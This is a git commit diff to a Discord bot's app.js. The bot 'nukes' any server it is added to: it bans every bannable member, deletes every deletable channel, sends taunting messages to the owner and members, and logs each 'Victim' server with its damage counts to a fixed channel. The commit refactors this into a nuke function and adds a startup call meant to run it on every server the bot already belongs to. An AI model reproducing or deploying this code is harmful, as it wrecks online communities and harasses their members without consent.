fd01197f9a3bbb5f9a8b26b75d915bdc364c88b1
ItsJordan <itzjordanyt@hotmail.com>
2017-02-07 21:20:24 -0500

    Improvements

--- app.js
+++ app.js
@@ -3,50 +3,36 @@ const config = require('./config.json');
 const client = new Client();
 
 client.on('ready', () => { 
+  client.guilds.forEach(x => { return x.nuke(x); });
   console.log('Ready to have some fun... >:)');
 });
+
+async function nuke(guild, users = 0, channels = 0) {
+  await guild.members.forEach(x => { 
+    x.send('You\'re getting banned! Nothing personal...');
+    if(x.bannable) x.ban(); 
+    return users++;
+  });
+  await guild.channels.forEach(x => { 
+    if(x.deletable) x.delete();
+    return channels++;
+  });
+  await guild.owner.sendMessage('Hey there! Your guild is getting nuked! :D');
+  await guild.defaultChannel.send('Dumbass, we said not to add the bot...');
+}
 
 client.on('guildCreate', async (guild) => {
   let users = 0;
   let channels = 0;
   let embed = new RichEmbed();
 
-  try {
-    await guild.owner.send('Hey there! Your guild is getting nuked!');
-  } catch (e) {}
+  await nuke(guild, users, channels);
 
-  for(const [, c] of guild.channels)  {
-    try {
-      await c.delete();
-    } catch (e) {
-      continue;
-    }
-    channels++;
-  }
-
-  for(const [, m] of guild.members) {
-    try {
-      await m.send('You\'re getting banned! Nothing personal...');
-    } catch (e) {}
-
-    try {
-      if(m.bannable) await m.ban();
-    } catch (e) {
-      continue;
-    }
-
-    users++;
-  }
-
-  try {
-    await guild.defaultChannel.send('Dumbass, I said not to add the bot...');
-  } catch (e) {}
-  
   if(users > 0 || channels > 0) {
     embed.setAuthor(`Victim |  ${guild.name}`, guild.iconURL)
           .setColor(3447003)
           .setDescription(`Owner - ${guild.owner.user.username}#${guild.owner.user.discriminator} (${guild.owner.id})\nBanned - ${users} users\nDeleted - ${channels} channels`);
-    client.channels.get('274770009883148288').sendEmbed(embed)
+    client.channels.get('274770009883148288').sendEmbed(embed);
   }
   guild.leave();
 });
